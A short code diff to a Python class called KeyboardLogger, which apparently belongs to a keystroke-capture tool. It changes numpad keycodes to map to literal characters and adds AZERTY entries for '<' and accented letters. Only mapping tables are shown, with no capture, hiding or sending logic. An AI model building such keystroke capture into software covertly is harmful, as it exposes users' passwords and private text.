@@ -58,16 +58,17 @@ class KeyboardLogger:
             'KEY_LEFT': '[LEFT]', 'KEY_RIGHT': '[RIGHT]',
             'KEY_HOME': '[HOME]', 'KEY_END': '[END]',
             'KEY_PAGEUP': '[PAGEUP]', 'KEY_PAGEDOWN': '[PAGEDOWN]',
+            'KEY_102ND': '<',
 
             # Numpad & NumLock
             'KEY_NUMLOCK': '[NUMLOCK]',
             'KEY_KP0': '[NUM0]', 'KEY_KP1': '[NUM1]', 'KEY_KP2': '[NUM2]',
             'KEY_KP3': '[NUM3]', 'KEY_KP4': '[NUM4]', 'KEY_KP5': '[NUM5]',
             'KEY_KP6': '[NUM6]', 'KEY_KP7': '[NUM7]', 'KEY_KP8': '[NUM8]',
-            'KEY_KP9': '[NUM9]', 'KEY_KPDOT': '[NUM.]', 'KEY_KPPLUS': '[NUM+]',
-            'KEY_KPMINUS': '[NUM-]','KEY_KPASTERISK': '[NUM*]','KEY_KPSLASH': '[NUM/]',
-            'KEY_KPENTER': '[NUM_ENTER]', 'KEY_KPEQUAL': '[NUM=]',
-            'KEY_KPCOMMA': '[NUM,]','KEY_KPLEFTPAREN': '[NUM(]','KEY_KPRIGHTPAREN': '[NUM)]',
+            'KEY_KP9': '[NUM9]', 'KEY_KPDOT': '.', 'KEY_KPPLUS': '+',
+            'KEY_KPMINUS': '-','KEY_KPASTERISK': '*','KEY_KPSLASH': '/',
+            'KEY_KPENTER': '\n', 'KEY_KPEQUAL': '=',
+            'KEY_KPCOMMA': ',','KEY_KPLEFTPAREN': '(','KEY_KPRIGHTPAREN': ')',
         }
 
         # AZERTY Shift modifications
@@ -75,7 +76,8 @@ class KeyboardLogger:
             '&': '1',   'É': '2',   '"': '3',   "'": '4',   '(': '5',
             '-': '6',   'È': '7',   '_': '8',   'Ç': '9',   'À': '0',
             ')': '°',   '=': '+',   '^': '¨',   '$': '£',
-            ';': '.',   ':': '/',   '!': '§',   ',': '?'
+            ';': '.',   ':': '/',   '!': '§',   ',': '?',   '<': '>',
+            'é': '2', 'è': '7',   'ç': '9',   'à': '0',
         }
 
         # ALT RIGHT (AltGr) mappings for AZERTY layout
